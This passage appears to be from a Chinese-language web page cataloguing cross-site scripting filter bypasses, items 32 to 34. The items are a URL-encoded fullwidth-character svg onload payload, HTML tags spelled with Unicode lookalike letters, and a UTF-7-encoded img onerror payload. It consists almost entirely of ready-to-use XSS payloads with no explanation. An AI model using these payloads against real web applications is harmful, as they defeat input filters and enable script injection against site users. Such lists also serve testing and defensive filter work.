&lt;h3 id=&#34;32-绕过-using-unicode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#32-绕过-using-unicode&#34;&gt;#&lt;/a&gt; 32. 绕过 using Unicode&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;%&lt;span class=&#34;variable constant_&#34;&gt;CA&lt;/span&gt;%&lt;span class=&#34;variable constant_&#34;&gt;BA&lt;/span&gt;%&lt;span class=&#34;variable constant_&#34;&gt;EF&lt;/span&gt;%&lt;span class=&#34;variable constant_&#34;&gt;BC&lt;/span&gt;%9E%&lt;span class=&#34;variable constant_&#34;&gt;EF&lt;/span&gt;%&lt;span class=&#34;variable constant_&#34;&gt;BC&lt;/span&gt;%9Csvg%20onload=alert%&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;/&lt;span class=&#34;variable constant_&#34;&gt;XSS&lt;/span&gt;/%&lt;span class=&#34;number&#34;&gt;29&lt;/span&gt;%&lt;span class=&#34;variable constant_&#34;&gt;EF&lt;/span&gt;%&lt;span class=&#34;variable constant_&#34;&gt;BC&lt;/span&gt;%9E/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;33-绕过-using-unicode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#33-绕过-using-unicode&#34;&gt;#&lt;/a&gt; 33. 绕过 using Unicode&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;ſvg&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onload&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;...&lt;/span&gt; &amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;ıframe&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onload&lt;/span&gt;=&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;34-绕过-using-utf-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#34-绕过-using-utf-7&#34;&gt;#&lt;/a&gt; 34. 绕过 using UTF-7&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;+&lt;span class=&#34;title class_&#34;&gt;ADw&lt;/span&gt;-img src=+&lt;span class=&#34;variable constant_&#34;&gt;ACI&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;+&lt;span class=&#34;variable constant_&#34;&gt;ACI&lt;/span&gt;- onerror=+&lt;span class=&#34;variable constant_&#34;&gt;ACI&lt;/span&gt;-&lt;span class=&#34;title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)+&lt;span class=&#34;variable constant_&#34;&gt;ACI&lt;/span&gt;- /+&lt;span class=&#34;title class_&#34;&gt;AD4&lt;/span&gt;-&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
